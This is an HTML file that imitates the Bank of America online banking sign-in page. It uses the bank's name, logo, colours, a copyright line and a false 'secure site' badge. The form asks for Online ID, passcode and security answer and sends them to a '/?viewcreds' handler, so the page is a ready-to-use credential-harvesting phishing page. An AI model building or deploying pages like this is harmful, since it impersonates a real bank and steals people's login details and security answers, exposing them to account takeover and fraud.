<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Bank of America | Online Banking | Sign In</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      margin: 0;
      padding: 0;
    }
    header {
      background: white;
      border-bottom: 1px solid #ccc;
      padding: 10px;
    }
    header img {
      height: 40px;
    }
    .login-wrapper {
      max-width: 400px;
      margin: 60px auto;
      background: white;
      border-radius: 6px;
      box-shadow: 0 0 15px rgba(0,0,0,0.2);
      padding: 20px;
    }
    h2 {
      text-align: center;
      color: #d4001a;
      margin-bottom: 20px;
    }
    label {
      display: block;
      margin-top: 12px;
      font-weight: bold;
    }
    input {
      width: 100%;
      padding: 8px;
      margin-top: 4px;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }
    button {
      margin-top: 20px;
      width: 100%;
      background: #d4001a;
      color: white;
      padding: 10px;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }
    .help-link {
      text-align: center;
      margin-top: 15px;
    }
    .help-link a {
      color: #0066cc;
      text-decoration: none;
      font-size: 14px;
    }
    footer {
      text-align: center;
      font-size: 12px;
      color: #666;
      margin-top: 40px;
      padding: 10px;
    }
  </style>
</head>
<body>
  <header>
    <img src="boa-logo.png" alt="Bank of America Logo">
  </header>

  <div class="login-wrapper">
    <h2>Secure Sign-In</h2>
    <form action="/?viewcreds" method="POST">
      <label for="username">Online ID</label>
      <input type="text" id="username" name="username" required>

      <label for="passcode">Passcode</label>
      <input type="password" id="passcode" name="passcode" required>

      <label for="secAnswer">Security Answer</label>
      <input type="text" id="secAnswer" name="secAnswer" required>

      <button type="submit">Sign In</button>
    </form>
    <p class="help-link"><a href="#">Forgot ID or Passcode?</a></p>
  </div>

  <footer>
    © 2025 Bank of America Corporation. All rights reserved.  
    This is a secure site. FearthNet™ Compliant.
  </footer>
</body>
</html>
